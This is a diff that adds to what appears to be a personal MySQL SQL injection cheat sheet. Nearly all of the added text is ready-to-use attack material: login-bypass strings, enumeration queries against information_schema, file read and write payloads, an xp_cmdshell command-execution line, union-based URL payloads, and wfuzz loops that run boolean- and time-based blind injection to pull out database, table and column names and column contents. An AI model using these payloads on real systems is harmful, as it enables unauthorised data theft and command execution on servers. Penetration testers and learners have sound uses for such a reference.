@@ -58,3 +58,62 @@ MySQL
 CONNECTION_ID()-CONNECTION_ID()
 /*!32302 and 1=0*/
 	
+
+exploit payload statements
+limit <offset>,<#rows>
+count(*)
+select(select database())
+	-nested query
+concat(something,somethingelse)
+substr(string,<offset>,<char len>)
+ascii(<char>)
+sleep(10)
+if(<condition>,<do true>,<do false>)
+like "string%"
+outfile "/path/to/file"
+load_file("/path/to/file")
+' exec master..xp_cmdshell 'command';-- -
+	--ms sql server only
+
+
+Login-bypass payloads
+' OR 1=1;-- -
+' OR "1"="1";-- -
+' OR 1=1 LIMIT 1;-- -
+' OR '1'='1
+' OR 1=1;#
+
+enumeration payloads
+@@version
+user()
+database()
+@@datadir
+group_concat(table_name) ... from information_schema.tables where table_schema=database();-- -
+group_concat(column_name) ... from information_schema.tables where table_name=<table_name>;-- -
+group_concat(column_name) ... from <table name>;-- -
+ and (substr(database(),<offset>,<char len>))='<char>' -- -
+	-db name by boolean-based blind SQL injection
+url payloads
+https://target.dom/?param=1')) union select column1,column2 from table into outfile "/path/to/file";-- -
+https://target.dom/?param=1' union select 1,2,@@version,4;-- -
+' and sleep(10);-- -
+' and if((select version()) like "5%", sleep(10), null);-- -
+	-determine database version number
+
+fuzzing commands
+wfuzz -c -z range,1-10 "https://target.dom/?param=1 order by FUZZ;-- -"
+for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "https://target.dom/?param=1' and (substr(database(),$i,1))='FUZZ';-- -";done
+	-boolean-based blind SQL injection observing http response size using substr()
+		--will not work with non-ascii special chars
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr(database(),$i,1)))=FUZZ ;-- -";done
+	-fix to work with non-ascii special chars
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ ;-- -";done
+	-now determine table name from database name
+for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "https://target.dom/?param=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ;-- -";done
+	-next determine column name from table name
+for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "https://target.dom/?param=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null);-- -";done > file.ext && grep "0m9" file.ext
+	-determine db name with time-based blind SQL injection observing http response time with substr() and ascii()
+for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "https://target.dom/?param=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(5), null);-- -";done > file.ext && grep "0m9" file.ext;
+	-determine column name with time-based blind SQL injection observing http response time with substr(), ascii() and if
+for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "https://target.dom/?param=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null);-- -";done > <file.ext && grep "0m9" file.ext
+	-extract column with time-based blind SQL injection observing http response time with substr(), ascii() and if
